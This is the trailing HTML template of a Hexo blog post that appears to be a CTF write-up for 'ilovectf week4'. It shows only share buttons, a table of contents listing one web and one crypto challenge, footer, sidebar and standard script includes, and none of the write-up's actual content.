            <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://incldue.github.io/2025/11/01/ilovectf%20week4%20%E9%83%A8%E5%88%86WP/" data-title="Google+">
              <i class="fa fa-google-plus"></i>
            </a>
          </li>
        </ul>
     </div>
</div>
<div class="post-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;" id="wxShare-close">×</a>
    <p>扫一扫，分享到微信</p>
    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://incldue.github.io/2025/11/01/ilovectf%20week4%20%E9%83%A8%E5%88%86WP/" alt="微信分享二维码">
</div>

<div class="mask"></div>

        
        <ul class="article-footer-menu">
            
            
  <li class="article-footer-tags">
    <i class="fa fa-tags"></i>
      
    <a href="/tags/比赛个人WP/" class="color2">比赛个人WP</a>
      
  </li>

        </ul>
        
    </footer>
  </div>
</article>


    <aside class="post-toc-pos post-toc-top" id="post-toc">
        <nav class="post-toc-wrap">
            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#WEB"><span class="post-toc-text">WEB</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Week4-Path-to-Hero"><span class="post-toc-text">[Week4] Path to Hero</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Crypto"><span class="post-toc-text">Crypto</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Week4-Myneighbors"><span class="post-toc-text">[Week4] Myneighbors</span></a></li></ol></li></ol>
        </nav>
    </aside>
    

<nav id="article-nav">
  
  
    <a href="../../../10/24/XAUTCTF2025%20rev&algo%E9%83%A8%E5%88%86WP/" id="article-nav-older" class="article-nav-link-wrap">
      <span class="article-nav-title">2025 XAUTCTF新生赛 rev&amp;algo部分WP</span>
      <i class="fa fa-hand-o-right" aria-hidden="true"></i>
    </a>
  
</nav>



    
</section>
        
      </div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info" class="inner">
      
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


      <p>
        Powered by  <a href="http://hexo.io/" target="_blank">Hexo</a>
        Theme <a href="//github.com/wongminho/hexo-theme-miho" target="_blank">MiHo</a>
      &copy; 2025 debu8ger<br>
      </p>
    </div>
  </div>
</footer>
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
<script>
  var mihoConfig = {
      root: "https://incldue.github.io",
      animate: true,
      isHome: false,
      share: true,
      reward: 0
  }
</script>
<div class="sidebar">
    <div id="sidebar-search" title="Search">
        <i class="fa fa-search"></i>
    </div>
    <div id="sidebar-category" title="Categories">
        <i class="fa fa-book"></i>
    </div>
    <div id="sidebar-tag" title="Tags">
        <i class="fa fa-tags"></i>
    </div>
    <div id="sidebar-top">
        <span class="sidebar-top-icon"><i class="fa fa-angle-up"></i></span>
    </div>
</div>
<div class="sidebar-menu-box" id="sidebar-menu-box">
    <div class="sidebar-menu-box-container">
        <div id="sidebar-menu-box-categories">
            <a class="category-link" href="../../../../categories/CTF%E7%9B%B8%E5%85%B3/">CTF相关</a><a class="category-link" href="../../../../categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/">安全相关</a><a class="category-link" href="../../../../categories/%E6%9D%82%E8%B0%88/">杂谈</a><a class="category-link" href="../../../../categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/">程序设计</a>
        </div>
        <div id="sidebar-menu-box-tags">
            <a href="../../../../tags/CTF%E5%85%A5%E9%97%A8/" style="font-size: 10px;">CTF入门</a> <a href="../../../../tags/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 20px;">CTF基础知识</a> <a href="../../../../tags/CTF%E8%B5%9B%E9%A2%98/" style="font-size: 10px;">CTF赛题</a> <a href="../../../../tags/SRC%E6%8C%96%E6%B4%9E/" style="font-size: 12.5px;">SRC挖洞</a> <a href="../../../../tags/%E5%93%B2%E6%80%9D/" style="font-size: 10px;">哲思</a> <a href="../../../../tags/%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BAWP/" style="font-size: 17.5px;">比赛个人WP</a> <a href="../../../../tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="../../../../tags/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/" style="font-size: 12.5px;">编程学习</a> <a href="../../../../tags/%E9%9A%8F%E7%AC%94/" style="font-size: 15px;">随笔</a>
        </div>
    </div>
    <a href="javascript:;" class="sidebar-menu-box-close">&times;</a>
</div>
<div class="mobile-header-menu-nav" id="mobile-header-menu-nav">
    <div class="mobile-header-menu-container">
        <span class="title">Menus</span>
        <ul class="mobile-header-menu-navbar">
            
            <li>
                <a  href="../../../../index.html">
                    <i class="fa fa-home"></i><span>Home</span>
                </a>
            </li>
            
            <li>
                <a  href="../../../../archives">
                    <i class="fa fa-archive"></i><span>Archives</span>
                </a>
            </li>
            
            <li>
                <a  href="../../../../about">
                    <i class="fa fa-user"></i><span>About</span>
                </a>
            </li>
            
        </ul>
    </div>
    <div class="mobile-header-tag-container">
        <span class="title">Tags</span>
        <div id="mobile-header-container-tags">
            <a href="../../../../tags/CTF%E5%85%A5%E9%97%A8/" style="font-size: 10px;">CTF入门</a> <a href="../../../../tags/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 20px;">CTF基础知识</a> <a href="../../../../tags/CTF%E8%B5%9B%E9%A2%98/" style="font-size: 10px;">CTF赛题</a> <a href="../../../../tags/SRC%E6%8C%96%E6%B4%9E/" style="font-size: 12.5px;">SRC挖洞</a> <a href="../../../../tags/%E5%93%B2%E6%80%9D/" style="font-size: 10px;">哲思</a> <a href="../../../../tags/%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BAWP/" style="font-size: 17.5px;">比赛个人WP</a> <a href="../../../../tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="../../../../tags/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/" style="font-size: 12.5px;">编程学习</a> <a href="../../../../tags/%E9%9A%8F%E7%AC%94/" style="font-size: 15px;">随笔</a>
        </div>
    </div>
</div>
<div class="search-wrap">
    <span class="search-close">&times;</span>
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
            <i class="icon icon-lg icon-chevron-left"></i>
        </a>
        <input class="search-field" placeholder="Search..." id="keywords">
        <a id="search-submit" href="javascript:;">
            <i class="fa fa-search"></i>
        </a>
    <div class="search-container" id="search-container">
        <ul class="search-result" id="search-result">
        </ul>
    </div>
</div>

<div id="search-tpl">
    <li class="search-result-item">
        <a href="{url}" class="search-item-li">
            <span class="search-item-li-title" title="{title}">{title}</span>
        </a>
    </li>
</div>

<script src="../../../../js/search.js"></script>


<script src="../../../../js/main.js"></script>



  <script src="//cdn.bootcss.com/particles.js/2.0.0/particles.min.js"></script>
  <div id="particles"></div>
  
<script src="../../../../js/particles.js"></script>








  
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">

  <script src="//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js"></script>
  
<script src="../../../../js/animate.js"></script>



  
<script src="../../../../js/pop-img.js"></script>

  <script>
     $(".article-entry p img").popImg();
  </script>

  </div>
</body>
</html>